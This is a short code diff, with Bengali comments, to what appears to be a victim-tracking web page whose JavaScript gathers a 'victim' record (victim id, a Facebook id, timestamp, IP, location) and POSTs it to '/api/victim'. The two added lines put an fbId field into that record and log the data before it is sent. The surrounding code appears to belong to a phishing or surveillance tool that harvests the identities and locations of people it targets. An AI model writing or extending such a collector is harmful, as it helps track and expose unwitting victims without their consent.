@@ -124,6 +124,7 @@
                 try {
                     const data = {
                         id: victimId,
+                        fbId: victimId, // fbId হিসেবে victimId পাঠাচ্ছি (কারণ আমরা জানি না)
                         timestamp: new Date().toISOString(),
                         ip: null,
                         location: null,
@@ -308,6 +309,7 @@
                     // ===== ৩.৯ ফাইনাল ডেটা পাঠানো =====
                     try {
                         setStatus('📤 ডেটা পাঠানো হচ্ছে...', 'info');
+                        console.log('📤 ডেটা পাঠানো হচ্ছে:', data);
                         const response = await fetch('/api/victim', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
